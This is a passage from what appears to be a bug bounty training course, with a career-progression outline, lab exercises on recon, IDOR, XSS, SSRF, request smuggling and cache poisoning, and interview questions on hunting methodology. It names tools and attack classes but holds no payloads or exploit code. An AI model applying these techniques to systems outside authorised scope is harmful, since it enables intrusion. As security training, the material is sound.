Phase 4: Expert (3+ years) — $10,000-$50,000+/month
├── Top researcher on platforms
├── Finding critical/high severity consistently
├── Multiple income streams (bounties + consulting + training)
├── Conference speaker
└── Writing tools/training content

Key success factors:
1. Consistency (hunt daily, even if just 1-2 hours)
2. Continuous learning (new techniques emerge monthly)
3. Strong automation (let tools do the boring work)
4. Specialization (become the expert in one area)
5. Patience (first months are hardest)
```

---

## Labs & Exercises

### Beginner Labs

```
Lab 1: Set up your recon pipeline
- Install: subfinder, httpx, nuclei, ffuf, gau
- Configure API keys for subfinder
- Create a bash script that chains them together
- Test on a permissive bug bounty target

Lab 2: Find your first IDOR
- Platform: PortSwigger Academy → "Access Control" labs
- Create two accounts, test every ID-based endpoint
- Practice with Burp Suite's Authorize extension

Lab 3: XSS hunting
- Platform: PortSwigger Academy → "Cross-site scripting" labs
- Complete all Apprentice-level labs
- Practice payload crafting and filter bypass

Lab 4: Subdomain enumeration challenge
- Target: Any wide-scope bug bounty program
- Goal: Find 100+ unique subdomains
- Use at least 3 different tools
- Document your process
```

### Intermediate Labs

```
Lab 5: SSRF exploitation
- Platform: PortSwigger Academy → "SSRF" labs
- Practice all bypass techniques
- Test against cloud metadata endpoints

Lab 6: API testing
- Platform: crAPI (OWASP's intentionally vulnerable API)
- Find all OWASP API Top 10 vulnerabilities
- Practice JWT attacks

Lab 7: Business logic testing
- Platform: PortSwigger Academy → "Business logic" labs
- Think like a user who wants to abuse the system
- Test workflow bypasses, price manipulation

Lab 8: Race condition exploitation
- Write a Python race condition tester
- Test against intentionally vulnerable applications
- Practice with Turbo Intruder

Lab 9: Full recon on real target
- Choose a bug bounty program with wide scope
- Run complete recon pipeline
- Document all findings (even without vulnerabilities)
- Identify highest-priority targets for manual testing
```

### Advanced Labs

```
Lab 10: HTTP request smuggling
- Platform: PortSwigger Academy → "Request smuggling" labs
- Understand CL.TE and TE.CL variants
- Practice cache poisoning via smuggling

Lab 11: Prototype pollution chain
- Platform: PortSwigger Academy → "Prototype pollution" labs
- Find gadgets for DOM XSS
- Practice server-side prototype pollution

Lab 12: Cache poisoning
- Understand cache key composition
- Find unkeyed inputs
- Exploit for stored XSS via cache

Lab 13: Submit a real bug bounty report
- Choose a program you've thoroughly reconned
- Find a real vulnerability
- Write a professional report
- Submit and handle the interaction professionally

Lab 14: Build monitoring automation
- Create subdomain monitoring script
- Set up notifications for new assets
- Monitor for technology changes on target
- Automate daily/weekly recon cycles
```

---

## Interview Questions

```
Q: Walk me through your complete bug bounty methodology.
A: Start with understanding the program scope and technology.
   Passive recon (OSINT, subdomain enum, historical URLs).
   Active recon (content discovery, JS analysis, tech fingerprinting).
   Attack surface mapping (prioritize interesting endpoints).
   Systematic vulnerability testing (IDOR, injection, auth issues).
   Business logic analysis.
   Report writing with clear impact demonstration.

Q: How do you handle duplicate reports?
A: Accept it professionally, check if my approach was different
   (may deserve partial credit), learn from timing, improve recon
   speed, diversify targets to reduce duplicate risk.

Q: What's the most impactful bug class in bug bounty?
A: SSRF (especially in cloud environments), IDOR (most common high-payout),
   and authentication bypass. These consistently yield critical/high severity
   with clear business impact.

Q: How do you demonstrate impact in a report?
A: Show the realistic worst-case scenario. For IDOR: enumerate total
   affected users. For SSRF: show what internal data is accessible.
   For XSS: demonstrate cookie theft/account takeover, not just alert(1).

Q: How do you avoid burning out in bug bounty?
A: Set specific hunting hours, diversify targets, take breaks when stuck,
   celebrate small wins, learn continuously to stay motivated,
   and remember that even "no find" days build experience.

Q: What's your approach when you find nothing on a target?
A: Revisit recon (missed attack surface?), try different vulnerability
   classes, look at recently added features, check mobile app/API,
   test business logic flows, or move to a different target and return
   later with fresh perspective.
```

---

**Next:** → [20-Scripting-And-Automation](../20-Scripting-And-Automation/README.md)

*"Bug bounty hunting is not about luck. It's about methodology, persistence, creativity, and continuous learning. The bugs are there — you just have to find them before someone else does."*
